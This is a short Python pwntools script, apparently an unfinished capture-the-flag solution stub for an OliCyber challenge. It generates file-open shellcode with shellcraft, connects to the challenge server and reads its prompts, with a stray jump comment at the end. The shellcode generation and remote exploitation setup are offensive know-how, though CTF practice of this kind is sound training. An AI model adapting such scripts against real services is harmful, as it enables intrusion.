#!/usr/bin/env python3
from pwn import *
print(shellcraft.open("sw-20"))
r = remote("software-20.challs.olicyber.it", 13003)
print(r.sendlineafter(b'iniziare ...', b''))
print(r.recvuntil(b': '))
#jmp *%0
